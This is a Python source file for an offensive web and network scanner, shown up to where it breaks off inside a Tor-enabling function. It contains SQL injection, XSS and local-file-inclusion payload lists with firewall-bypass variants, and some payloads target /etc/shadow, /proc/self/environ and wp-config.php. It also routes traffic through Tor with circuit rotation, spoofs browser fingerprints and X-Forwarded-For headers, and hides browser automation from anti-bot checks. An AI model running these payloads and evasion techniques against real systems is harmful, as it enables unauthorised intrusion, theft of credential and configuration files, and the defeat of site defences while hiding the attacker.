import socket
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import os
import re
import functools
import random
import html as _html
from ipaddress import ip_network, ip_address
from itertools import cycle
from urllib.parse import urlparse, parse_qs, urlunparse
import logging
import socks
import ssl
import requests

import proxy_tester

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logger = logging.getLogger("scanner")

try:
    sys.stdout.reconfigure(line_buffering=False, write_through=True)
except (AttributeError, ValueError):
    pass

print = functools.partial(print, flush=True)

from scapy.all import IP, TCP, UDP, ICMP, Raw, sr1, sr, sniff, fragment
from scapy.layers.http import HTTPRequest
from scapy.layers.dns import DNS

try:
    from faker import Faker

    fake = Faker()
    HAS_FAKER = True
except ImportError:
    HAS_FAKER = False
try:
    from scan_win import main_menu as win_scanner_menu

    HAS_WINSCAN = True
except Exception as e:
    HAS_WINSCAN = False
    WINSCAN_ERROR = str(e)
try:
    from scu import main as email_scanner_main

    HAS_EMAILSCAN = True
except Exception as e:
    HAS_EMAILSCAN = False
    EMAILSCAN_ERROR = str(e)

try:
    import px

    HAS_PROXYTEST = True
except Exception as e:
    HAS_PROXYTEST = False
    PROXYTEST_ERROR = str(e)

_original_socket = socket.socket

MAX_PING_SWEEP_HOSTS = 4096
DECOY_MAX = 22


def _safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9._-]', '_', str(name))[:100]


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    ORANGE = '\033[38;2;255;165;0m'
    DIM_GRAY = '\033[38;2;110;110;120m'
    NEON_CYAN = '\033[38;2;0;255;213m'
    NEON_PURPLE = '\033[38;2;191;64;255m'
    CORNFLOWER_BLUE = '\033[38;2;100;149;237m'
    SKY_BLUE = '\033[38;2;135;206;235m'
    FRAME = '\033[38;2;138;92;246m'
    CRIMSON = '\033[38;2;220;20;60m'
    AQUA = '\033[38;2;0;255;255m'
    TEAL = '\033[38;2;0;128;128m'
    GOLD = '\033[38;2;255;215;0m'
    DIM = '\033[2m'


SERVICES = {
    20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "TELNET",
    25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3",
    111: "RPC", 135: "MSRPC", 139: "NETBIOS", 143: "IMAP",
    443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
    1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
    5900: "VNC", 6379: "Redis", 8080: "HTTP-ALT", 8443: "HTTPS-ALT",
    27017: "MongoDB", 8000: "HTTP-ALT", 8001: "HTTP-ALT",
    8003: "HTTP-ALT", 3000: "HTTP-ALT", 5000: "HTTP-ALT"
}

UDP_SERVICES = {
    53: "DNS", 67: "DHCP", 69: "TFTP", 123: "NTP",
    137: "NETBIOS-NS", 161: "SNMP", 162: "SNMP-TRAP",
    500: "IKE", 514: "SYSLOG", 1900: "SSDP", 5353: "MDNS"
}

HTTP_PORTS = [80, 443, 8080, 8443, 8000, 8001, 8003, 3000, 5000]

ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "' oR '1'='1", "' Or '1'='1", "' oR 1=1--",
    "'%09OR%091=1--", "'%0AOR%0A1=1--",
    "'/**/OR/**/1=1--", "'+OR+1=1--",
    "' UN/**/ION SEL/**/ECT NULL--",
    "' /*!50000UNION*/ /*!50000SELECT*/ NULL--",
    "%27%20OR%201%3D1--", "%27%20%4F%52%201%3D1--",
    "%2527%2520OR%25201%253D1--",
    "' OR 'a'='a'--", "' OR 2>1--", "' OR TRUE--",
    "' OR 'x' LIKE 'x'--", "' OR 1 BETWEEN 0 AND 2--",
    "' O'+'R 1=1--", "' O'||'R 1=1--",
    "'%00OR 1=1--", "') OR ('1'='1", "1' AND '1'='1",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UN/**/ION SEL/**/ECT NULL--",
    "%27%20UNION%20SELECT%20NULL--",
]

TIME_PAYLOADS = [
    "' AND SLEEP(5)--", "' OR SLEEP(5)--", "' AND SLEEP(5)#",
    "'/**/AND/**/SLEEP(5)--", "' aNd sLeEp(5)--",
    "' AND BENCHMARK(5000000,MD5('a'))--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' AND pg_sleep(5)--", "'; WAITFOR DELAY '0:0:5'--",
    "' AND dbms_pipe.receive_message(('a'),5)--",
    "%27%20AND%20SLEEP(5)--", "' AND SLE/**/EP(5)--",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("' aNd '1'='1", "' aNd '1'='2"),
    ("' AND 'a'='a", "' AND 'a'='b"),
    ("' AND TRUE--", "' AND FALSE--"),
    ("'/**/AND/**/'1'='1", "'/**/AND/**/'1'='2"),
    ("' AND 2>1--", "' AND 1>2--"),
]

# ========== XSS PAYLOADS ==========

XSS_PAYLOADS = {
    "basic": [
        ("<script>alert('XSS')</script>", "script-tag"),
        ("<script>alert(document.domain)</script>", "script-domain"),
        ("<script>alert(document.cookie)</script>", "script-cookie"),
        ("<script>confirm('XSS')</script>", "script-confirm"),
        ("<script>prompt('XSS')</script>", "script-prompt"),
        ("<img src=x onerror=alert('XSS')>", "img-onerror"),
        ("<img src=x onerror=confirm('XSS')>", "img-confirm"),
        ("<svg onload=alert('XSS')>", "svg-onload"),
        ("<svg/onload=alert('XSS')>", "svg-slash"),
        ("<body onload=alert('XSS')>", "body-onload"),
        ("<iframe src=javascript:alert('XSS')>", "iframe-js"),
        ("<object data=javascript:alert('XSS')>", "object-js"),
        ("<embed src=javascript:alert('XSS')>", "embed-js"),
        ("<form action=javascript:alert('XSS')><input type=submit>", "form-js"),
        ("<isindex action=javascript:alert('XSS') type=submit>", "isindex"),
    ],
    "waf_bypass": [
        ("<ScRiPt>alert('XSS')</sCrIpT>", "case-mixed-1"),
        ("<sCrIpT>alert('XSS')</ScRiPt>", "case-mixed-2"),
        ("<SCRIPT>alert('XSS')</SCRIPT>", "uppercase"),
        ("<img SRC=x ONERROR=alert('XSS')>", "upper-attrs"),
        ("<IMG SRC=x ONERROR=alert('XSS')>", "upper-all"),
        ("<img src=x OnErRoR=alert('XSS')>", "mixed-onerror"),
        ("<img src = x onerror = alert('XSS')>", "spaced-attrs"),
        ("<img/src=x/onerror=alert('XSS')>", "slash-sep"),
        ("<svg onload=alert('XSS') >", "svg-space"),
        ("<svg/onload=alert('XSS') >", "svg-slash-space"),
    ],
    "event_handler": [
        ("<a href=javascript:alert('XSS')>x</a>", "a-javascript"),
        ("<div onclick=alert('XSS')>x</div>", "onclick"),
        ("<div onmouseover=alert('XSS')>x</div>", "onmouseover"),
        ("<input autofocus onfocus=alert('XSS')>", "autofocus"),
        ("<input onfocus=alert('XSS') autofocus>", "autofocus-2"),
        ("<select autofocus onfocus=alert('XSS')>", "select-autofocus"),
        ("<textarea autofocus onfocus=alert('XSS')>", "textarea-autofocus"),
        ("<details open ontoggle=alert('XSS')>", "ontoggle"),
        ("<marquee onstart=alert('XSS')>x</marquee>", "marquee"),
        ("<video><source onerror=alert('XSS')>", "video-source"),
        ("<audio src=x onerror=alert('XSS')>", "audio-error"),
        ("<video src=x onerror=alert('XSS')>", "video-error"),
        ("<iframe onload=alert('XSS')>", "iframe-load"),
        ("<body onpageshow=alert('XSS')>", "body-pageshow"),
        ("<div onpointerover=alert('XSS')>x</div>", "pointerover"),
    ],
    "encoding": [
        ("<script>alert(String.fromCharCode(88,83,83))</script>", "charcode"),
        ("<script>alert(/XSS/.source)</script>", "regex-source"),
        ("<script>alert(atob('WFNT'))</script>", "base64"),
        ('<iframe srcdoc="<script>alert(\'XSS\')</script>">', "iframe-srcdoc"),
        ("<template><script>alert('XSS')</script></template>", "template"),
        ("<xmp><script>alert('XSS')</script></xmp>", "xmp"),
        ("<plaintext><script>alert('XSS')</script>", "plaintext"),
        ("<!--<img src=x onerror=alert('XSS')>-->", "html-comment"),
    ],
    "special": [
        ("<script>alert`1`</script>", "backtick"),
        ("<script>alert(1)</script>", "no-quote"),
        ("<script>alert(0x58)</script>", "hex"),
        ("<script>eval('ale'+'rt(1)')</script>", "concat"),
        ("<script>window['ale'+'rt'](1)</script>", "bracket"),
        ("<script>[].constructor.constructor('alert(1)')()</script>", "constructor"),
        ("<script>Function('alert(1)')()</script>", "function-ctor"),
        ("<svg><script>alert('XSS')</script></svg>", "svg-script"),
        ("<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>", "svg-animate"),
        ("<script src=data:text/javascript,alert('XSS')></script>", "data-src"),
        ("<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>", "meta-refresh"),
        ("<base href=javascript:alert('XSS')//>", "base-href"),
        ("<style>body{background:url('javascript:alert(\"XSS\")')}</style>", "style-url"),
    ],
}

LFI_PAYLOADS = {
    "basic": [
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "/etc/hosts",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/version",
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ],
    "bypass": [
        "....//....//....//....//etc/passwd",
        "....//....//....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
        "/var/www/../../etc/passwd",
        "/var/www/html/../../../etc/passwd",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "\\..\\..\\..\\windows\\win.ini",
    ],
    "wrapper": [
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../index.php",
        "php://filter/convert.base64-encode/resource=../../index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=../../config.php",
        "php://filter/convert.base64-encode/resource=../includes/config.php",
        "php://filter/convert.base64-encode/resource=wp-config.php",
        "php://filter/convert.base64-encode/resource=../wp-config.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    ],
    "log_poison": [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/var/log/nginx/access.log",
        "/var/log/apache2/error.log",
        "/var/log/httpd/error_log",
        "/usr/local/apache/log/access_log",
        "/var/log/auth.log",
        "/var/log/vsftpd.log",
        "/var/log/sshd.log",
    ],
}

LFI_SIGNATURES = {
    "linux_passwd": [
        "root:x:0:0",
        "daemon:x:1:1",
        "bin:x:2:2",
        "sys:x:3:3",
        "/bin/bash",
        "/bin/sh",
        "/usr/sbin/nologin",
    ],
    "linux_shadow": [
        "root:$",
        "daemon:*",
        "bin:*",
    ],
    "windows_winini": [
        "[fonts]",
        "[extensions]",
        "[mci extensions]",
        "for 16-bit app support",
    ],
    "windows_bootini": [
        "[boot loader]",
        "[operating systems]",
        "multi(0)disk(0)",
    ],
    "windows_hosts": [
        "# Copyright (c) 1993-2009 Microsoft",
        "# For example:",
        "127.0.0.1       localhost",
    ],
    "php_error": [
        "failed to open stream",
        "failed opening required",
        "include():",
        "require():",
        "Warning: include",
        "Warning: require",
        "Fatal error: include",
        "Fatal error: require",
    ],
    "php_source": [
        "<?php",
        "<?=",
        "<!DOCTYPE html>",
    ],
    "proc_environ": [
        "PATH=/",
        "HOME=/",
        "USER=",
        "SHELL=",
    ],
}

PHP_BASE64_RE = re.compile(r'[A-Za-z0-9+/]{100,}={0,2}')

PRESETS = {
    "quick": ["basic"],
    "normal": ["basic", "waf_bypass"],
    "deep": ["basic", "waf_bypass", "event_handler"],
    "insane": ["basic", "waf_bypass", "event_handler", "encoding", "special"],
}

DOM_SINKS = [
    "document.write", "document.writeln",
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "eval", "setTimeout", "setInterval",
    "location.href", "location.assign", "location.replace",
    "document.URL", "document.documentURI",
]

DOM_SOURCES = [
    "location.search", "location.hash", "location.href",
    "document.URL", "document.documentURI",
    "document.referrer", "window.name",
]

ERROR_KEYWORDS = [
    "sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_query",
    "mysqli", "warning: mysql", "you have an error in your sql",
    "check the manual that corresponds to your mysql",
    "pg_query", "postgresql", "pg_exec", "sqlite", "sqlite3",
    "ora-", "oracle", "quoted string not properly terminated",
    "microsoft ole db", "odbc", "unclosed quotation mark",
    "sqlserver", "mssql", "incorrect syntax near",
    "jdbc", "sqlstate", "sqlexception", "syntax error",
    "unexpected end of sql", "mariadb", "division by zero", "fatal error",
]

BROWSER_PROFILES = [
    {"name": "Chrome/Windows", "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Cache-Control": "max-age=0"}},
    {"name": "Chrome/Mac", "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1"}},
    {"name": "Chrome/Linux", "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}},
    {"name": "Firefox/Windows", "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive"}},
    {"name": "Firefox/Mac", "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5", "Connection": "keep-alive"}},
    {"name": "Safari/Mac", "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}},
    {"name": "Safari/iPhone", "headers": {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}},
    {"name": "Edge/Windows", "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}},
    {"name": "Chrome/Android", "headers": {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9", "Connection": "keep-alive"}},
]

print_lock = threading.Lock()
profile_lock = threading.Lock()
profile_cycle = None

STATUS_COLORS = {
    200: Colors.GREEN, 301: Colors.YELLOW, 302: Colors.YELLOW,
    401: Colors.RED, 403: Colors.RED, 500: Colors.RED,
}


def reset_profile_cycle(profiles=None):
    global profile_cycle
    with profile_lock:
        profile_cycle = cycle(profiles if profiles else BROWSER_PROFILES)


def get_next_profile():
    global profile_cycle
    with profile_lock:
        if profile_cycle is None:
            profile_cycle = cycle(BROWSER_PROFILES)
        return next(profile_cycle)


def get_faker_profile():
    if HAS_FAKER:
        return {"name": "Faker", "headers": {
            "User-Agent": fake.user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "X-Forwarded-For": fake.ipv4(),
            "X-Real-IP": fake.ipv4(),
        }}
    return get_next_profile()


try:
    from playwright.sync_api import sync_playwright

    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False


def fetch_all_with_playwright(urls, timeout=15, proxies=None, tor_rotation=False):
    if not HAS_PLAYWRIGHT:
        return {}
    CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
    import os as _os
    if not _os.path.exists(CHROME_PATH):
        EDGE_PATH = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        if _os.path.exists(EDGE_PATH):
            CHROME_PATH = EDGE_PATH
        else:
            print(f"{Colors.RED}[!] Chrome/Edge not found!{Colors.RESET}")
            print(f"{Colors.DIM_GRAY}[*] Edit CHROME_PATH in fetch_all_with_playwright{Colors.RESET}")
            return {}

    results = {}
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                executable_path=CHROME_PATH,
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--disable-dev-shm-usage",
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-web-security",
                    "--disable-features=IsolateOrigins,site-per-process",
                ]
            )

            # Tor detection
            is_tor = False
            proxy_config = None
            if proxies:
                proxy_url = proxies.get("http") or proxies.get("https")
                if proxy_url and "9050" in proxy_url:
                    proxy_url = proxy_url.replace("socks5h://", "socks5://")
                    proxy_config = {"server": proxy_url}
                    is_tor = True
                    print(f"        {Colors.CYAN}[*] Tor proxy: {proxy_url}{Colors.RESET}")
                elif proxy_url:
                    proxy_config = {"server": proxy_url}

            context_args = {
                "user_agent": (
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) "
                    "Chrome/120.0.0.0 Safari/537.36"
                ),
                "viewport": {"width": 1920, "height": 1080},
                "locale": "en-US",
                "timezone_id": "America/New_York",
                "ignore_https_errors": True,
                "java_script_enabled": True,
            }

            if proxy_config:
                context_args["proxy"] = proxy_config

            context = browser.new_context(**context_args)

            context.add_init_script("""
                Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                window.chrome = { runtime: {} };
            """)

            page = context.new_page()

            for i, url in enumerate(urls, 1):
                if tor_rotation and is_tor and i > 1 and i % 10 == 0:
                    print(f"\n        {Colors.CYAN}[*] Rotating Tor circuit (request {i})...{Colors.RESET}")
                    if new_tor_circuit():
                        context.close()
                        context = browser.new_context(**context_args)
                        context.add_init_script("""
                            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
                            Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                            window.chrome = { runtime: {} };
                        """)
                        page = context.new_page()
                        print(f"        {Colors.GREEN}[+] New Tor circuit ready{Colors.RESET}")

                try:
                    response = page.goto(url, timeout=timeout * 1000,
                                         wait_until="domcontentloaded")
                    results[url] = {
                        "status": response.status if response else 0,
                        "text": page.content(),
                    }
                except Exception as e:
                    logger.debug(f"playwright {url}: {type(e).__name__}: {e}")
                    results[url] = None

            browser.close()
    except Exception as e:
        logger.debug(f"fetch_all_with_playwright: {type(e).__name__}: {e}")

    return results


def get_service(port):
    return SERVICES.get(port, "")


def get_udp_service(port):
    return UDP_SERVICES.get(port, "")


def is_valid_ip(ip_str):
    try:
        ip_address(ip_str)
        return True
    except (ValueError, TypeError):
        return False


def is_public_ip(ip_str):
    try:
        ip_obj = ip_address(ip_str)
        return not (ip_obj.is_private or ip_obj.is_loopback or
                    ip_obj.is_multicast or ip_obj.is_reserved or
                    ip_obj.is_link_local or ip_obj.is_unspecified)
    except ValueError:
        return False


def get_os_simple(ttl):
    if ttl <= 64:
        return "Linux/Unix"
    elif ttl <= 128:
        return "Windows"
    elif ttl <= 255:
        return "Network Device"
    return "Unknown"


def get_os_from_ttl(ttl):
    if ttl <= 32:
        return "Windows 95/98"
    elif ttl <= 64:
        return "Linux/Unix/macOS/Android"
    elif ttl <= 128:
        return "Windows"
    elif ttl <= 200:
        return "IRIX"
    elif ttl <= 254:
        return "Solaris"
    elif ttl <= 255:
        return "Cisco/Router/Juniper"
    return "Unknown"


def strip_ansi(text):
    return re.sub(r'\033\[[0-9;]*m', '', text)


def _raw_write(text):
    os.write(sys.stdout.fileno(), text.encode(errors="ignore"))


def typed_input(prompt, delay=0.035):
    i = 0
    while i < len(prompt):
        ch = prompt[i]
        if ch == '\033':
            m = re.match(r'\033\[[0-9;]*m', prompt[i:])
            if m:
                _raw_write(m.group(0))
                i += len(m.group(0))
                continue
        _raw_write(ch)
        time.sleep(delay)
        i += 1
    return input()


def box_line(text, width=58, color=Colors.FRAME, text_color=Colors.WHITE):
    available = width - 4
    clean_text = strip_ansi(text)
    if len(clean_text) > available:
        clean_text = clean_text[:available]
        text = clean_text
    pad = available - len(clean_text)
    print(color + "| " + Colors.RESET + text_color + text + " " * max(0, pad) + color + " |" + Colors.RESET)


def box_top(width=58, color=Colors.FRAME):
    print(color + "+" + "-" * (width - 2) + "+" + Colors.RESET)


def box_bottom(width=58, color=Colors.FRAME):
    print(color + "+" + "-" * (width - 2) + "+" + Colors.RESET)


def box_divider(width=58, color=Colors.FRAME):
    print(color + "+" + "-" * (width - 2) + "+" + Colors.RESET)


def progress_bar(current, total, bar_length=40):
    if total <= 0:
        return
    if not sys.stdout.isatty():
        return
    progress = current / total
    block = int(round(bar_length * progress))
    text = (f"\r[{Colors.GREEN}{'#' * block}"
            f"{Colors.DIM_GRAY}{'-' * (bar_length - block)}"
            f"{Colors.RESET}] {int(progress * 100)}%")
    with print_lock:
        sys.stdout.write(text)
        sys.stdout.flush()


def os_scan_banner():
    print(Colors.CRIMSON + """
   ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ██╔═══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
  ██║   ██║███████╗    ███████╗██║     ███████║██╔██╗ ██║
  ██║   ██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ╚██████╔╝███████║    ███████║╚██████╗██║  ██║██║ ╚████║
   ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""" + Colors.RESET)
    print(Colors.CRIMSON + "OS DETECTION SCANNER".center(58) + Colors.RESET)
    print(Colors.DIM_GRAY + "-" * 58 + Colors.RESET)


def os_scan_only(target):
    os.system("clear" if os.name == "posix" else "cls")
    os_scan_banner()
    print(Colors.GOLD + f"\n[*] OS Detection for {target}..." + Colors.RESET)
    print(Colors.DIM_GRAY + f"[*] Trying multiple ports..." + Colors.RESET)
    print()

    ip, hostname = resolve_target(target)
    if not is_valid_ip(ip):
        print(Colors.RED + f"[!] Could not resolve: {target}" + Colors.RESET)
        return "Unknown"

    for port in [80, 443]:
        try:
            pkt = IP(dst=ip) / TCP(dport=port, flags="S")
            resp = sr1(pkt, timeout=2, verbose=0)
            if resp and resp.haslayer(IP):
                ttl = resp[IP].ttl
                os_type = get_os_from_ttl(ttl)
                print(Colors.GREEN + f"[+] Port {port} responded! TTL={ttl}" + Colors.RESET)
                print(Colors.NEON_CYAN + f"[+] Detected OS: {os_type}" + Colors.RESET)
                print()
                save = typed_input(Colors.AQUA + "[?] Save results? [txt/n]: " + Colors.RESET).strip().lower()
                if save == "txt":
                    filename = f"os_scan_{_safe_filename(ip)}_{int(time.time())}.txt"
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write(f"Target: {target}\nIP: {ip}\nPort: {port}\nTTL: {ttl}\nOS: {os_type}\n")
                    print(Colors.GREEN + f"[+] File saved: {filename}" + Colors.RESET)
                return os_type
        except Exception as e:
            logger.debug(f"os_scan_only port {port}: {type(e).__name__}: {e}")
            continue

    print(Colors.RED + "[!] OS not detected!" + Colors.RESET)
    return "Unknown"


def get_ip_retry(sites=None, retries=3):
    if sites is None:
        sites = ["https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"]
    for _ in range(retries):
        for site in sites:
            try:
                ip = requests.get(site, timeout=10).text.strip()
                if ip:
                    return ip
            except Exception as e:
                logger.debug(f"get_ip_retry {site}: {type(e).__name__}: {e}")
                continue
        time.sleep(2)
    return None


def verify_tor(proxies=None):
    try:
        r = requests.get("https://check.torproject.org/api/ip", timeout=15, proxies=proxies)
        return r.json().get("IsTor", False)
    except Exception as e:
        logger.debug(f"verify_tor: {type(e).__name__}: {e}")
        return False


def get_country(ip):
    try:
        geo = requests.get(f"https://ip-api.com/json/{ip}", timeout=10).json()
        return geo.get("country", "Unknown")
    except Exception as e:
        logger.debug(f"get_country {ip}: {type(e).__name__}: {e}")
        return "Unknown"


def new_tor_circuit():
    try:
        s = _original_socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(("127.0.0.1", 9051))
        s.sendall(b'AUTHENTICATE ""\r\n')
        time.sleep(0.5)
        s.sendall(b'SIGNAL NEWNYM\r\n')
        time.sleep(0.5)
        s.close()
        time.sleep(3)
        return True
    except Exception as e:
        logger.debug(f"new_tor_circuit: {type(e).__name__}: {e}")
        return False


def analyze_scan_result(open_ports, banners):
    if not open_ports:
        return "empty"
    blocked_keywords = ["403 forbidden", "429 too many", "503 service",
                        "access denied", "you have been blocked", "rate limit",
                        "cloudflare", "captcha"]
    http_banners = {p: b for p, b in banners.items() if p in HTTP_PORTS and b}
    if not http_banners:
        return "blocked" if len(open_ports) <= 3 else "success"
    blocked_count = 0
    for port, banner in http_banners.items():
        banner_lower = banner.lower()
        for kw in blocked_keywords:
            if kw in banner_lower:
                blocked_count += 1
                break
    return "blocked" if blocked_count == len(http_banners) else "success"


def enable_tor():
    result = {"connected": False, "ip": None, "country": None, "original_ip": None, "verified": False}
    print(Colors.GOLD + "\n[*] Connecting to Tor..." + Colors.RESET)
    original_ip = get_ip_retry()
    result["original_ip"] = original_ip
    if original_ip:
        print(Colors.DIM_GRAY + f"[*] Original IP: {original_ip}" + Colors.RESET)
    try:
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
    except Exception as e:
        print(Colors.RED + f"[-] Proxy setup failed: {e}" + Colors.RESET)
        logger.debug(f"enable_tor proxy: {type(e).__name__}: {e}")
        return result

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect_ex(("check.torproject.org", 80))
        s.sendall(b"HEAD / HTTP/1.0\r\nHost: check.torproject.org\r\n\r\n")
        data = s.recv(1024)
        s.close()
        if not data:
            print(Colors.RED + "[-] Tor test failed!" + Colors.RESET)
            disable_tor()
            return result
    except Exception as e:
        print(Colors.RED + f"[-] Tor error: {e}" + Colors.RESET)
        logger.debug(f"enable_tor test: {type(e).__name__}: {e}")
        disable_tor()
        return result

    new_ip = get_ip_retry()
    result["ip"] = new_ip
    if not new_ip:
        print(Colors.RED + "[!] Could not get Tor IP" + Colors.RESET)
        disable_tor()
        return result

    result["verified"] = verify_tor()
    if original_ip and new_ip and original_ip == new_ip:
        print(Colors.RED + "[!] WARNING: IP did not change!" + Colors.RESET)
        disable_tor()
        return result

    result["country"] = get_country(new_ip)
    result["connected"] = True
    print(Colors.FRAME + "=" * 50 + Colors.RESET)
